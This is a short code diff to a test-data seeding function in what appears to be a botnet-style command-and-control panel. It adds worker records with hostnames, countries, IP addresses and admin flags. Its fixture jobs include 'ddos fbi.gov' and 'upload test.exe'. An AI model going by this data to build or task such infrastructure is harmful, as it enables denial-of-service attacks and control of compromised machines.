@@ -9,10 +9,14 @@ from os import mkdir
 
 
 def add_test_data():
-    w = models.Worker(hostname='Predator', os='Windows 10', country='Germany', ip_addr='127.0.0.1')
-    w2 = models.Worker(hostname='Helios 300', os='Windows 7', country='England', ip_addr='127.2.4.1')
-    w3 = models.Worker(hostname='Acer Nexus', os='Windows 8', country='USA', ip_addr='127.11.55.1')
-    w4 = models.Worker(hostname='Predator', os='Windows 10', country='Russia', ip_addr='127.66.33.1')
+    w = models.Worker(id='C1vHa4fB9kukvA6ILps0kQ', hostname='Predator', os='Windows 10', country='Germany',
+                      ip_addr='127.0.0.1', is_admin=True)
+    w2 = models.Worker(id='K8_RNoHLL0S-UELe3WqhSw', hostname='Helios 300', os='Windows 7', country='England',
+                       ip_addr='127.2.4.1', is_admin=False)
+    w3 = models.Worker(id='8GYEaE8G5E2oZtVyxY8nxg', hostname='Acer Nexus', os='Windows 8', country='USA',
+                       ip_addr='127.11.55.1', is_admin=True)
+    w4 = models.Worker(id='cxi5YsNdk020NNMYhqZ78g', hostname='Predator', os='Windows 10', country='Russia',
+                       ip_addr='127.66.33.1', is_admin=False)
     db.session.add(w)
     sleep(1)
     db.session.commit()
@@ -24,7 +28,7 @@ def add_test_data():
     db.session.commit()
     db.session.add(w4)
 
-    j = models.Job(todo='upload test.exe', worker_id=w.id, done=True)
+    j = models.Job(todo='upload test.exe', worker_id=w.id, is_done=True)
     j2 = models.Job(todo='ddos fbi.gov', worker_id=w.id)
 
     ri = models.ResourceInfo(cpu='Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz 2.21 GHz',
